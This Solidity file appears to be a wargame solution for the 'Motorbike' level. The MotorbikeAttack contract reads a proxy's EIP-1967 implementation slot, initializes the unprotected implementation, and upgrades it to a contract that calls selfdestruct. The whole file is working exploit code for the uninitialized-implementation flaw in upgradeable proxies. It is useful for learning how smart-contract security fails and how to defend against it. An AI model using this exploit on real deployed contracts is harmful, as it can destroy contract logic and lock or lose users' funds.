// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.sol";

contract MotorbikeAttack is Broadcasted {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function attack(address payable motorbikeCtr_) public payable override {
        // get the implementation address
        address _implementationAddress = address(
            uint160(uint256(vm.load(motorbikeCtr_, _IMPLEMENTATION_SLOT)))
        );

        // initialize the implementation
        IEngine(_implementationAddress).initialize();

        // create new implementation with destruct
        NewImplementation _newImpAddress = new NewImplementation();

        // change the implementation's implementation and call selfdestruct
        IEngine(_implementationAddress).upgradeToAndCall(
            address(_newImpAddress),
            abi.encodeWithSignature("destruct()")
        );
    }
}

contract NewImplementation {
    function destruct() public {
        selfdestruct(payable(tx.origin));
    }
}

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(
        address _newImplementation,
        bytes calldata _data
    ) external payable;
}
